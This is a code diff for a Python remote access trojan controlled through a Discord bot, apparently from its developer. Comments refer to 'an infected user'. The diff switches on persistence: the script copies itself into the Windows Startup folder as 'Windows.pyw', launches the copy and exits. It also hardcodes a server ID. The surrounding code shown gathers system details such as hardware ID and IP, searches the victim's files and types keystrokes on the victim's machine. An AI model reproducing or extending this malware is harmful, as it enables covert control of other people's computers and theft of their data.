@@ -12,6 +12,7 @@ from os.path import join, exists
 from re import findall
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
+from shutil import copy
 
 
 import discord
@@ -23,7 +24,7 @@ from discord.utils import get
 global ping_on_startup
 global token
 global guild_iD
-guild_iD = ""
+guild_iD = "1036648125307297812"
 # guild id here
 token = ""
 # Bot Token Here Obviously
@@ -34,13 +35,11 @@ ChannelName = "general"
 # name of the channel you want to send the ping_on_startup message to
 # if the bot should ping you when an infected user starts the File
 
-"""
-path = f"%s/Microsoft/Windows/Start Menu/Programs/Startup/Windows.pyw" % getenv("appdata")
+path = f"%s/Microsoft/Windows/Start Menu/Programs/Startup/Windows.pyw" % os.getenv("appdata")
 if not exists(path):
 	copy(__file__, path)
-	startfile(path)
-"""
-
+	os.startfile(path)
+	exit()
 
 class Control(discord.Client):
 	def __init__(self):
@@ -184,7 +183,6 @@ def systemInfo():
 	info = platform.uname()
 	info_total = f"System: {info.system}\nRelease: {info.release}\nMachine: {info.machine}\nProcessor: {info.processor}\nHWID: {hwid}\nIp: {ip}"
 
-
 	with open(f"{temp}\\systeminfo.txt", "w") as f:
 		f.write(info_total)
 	f.close()
@@ -197,7 +195,6 @@ def systemInfo():
 
 global temp
 temp = os.getenv('TEMP')
-
 
 
 def searchFile(directory: str, keyword: str):
@@ -384,7 +381,7 @@ async def typing(interaction: discord.Interaction, message: str):
 	try:
 		await interaction.channel.send(victimtype(message))
 	except Exception as err:
-		await interaction.channel.send("Error while typing: "+err)
+		await interaction.channel.send("Error while typing: "+str(err))
 
 
 @bot.tree.command(name="tasklist",
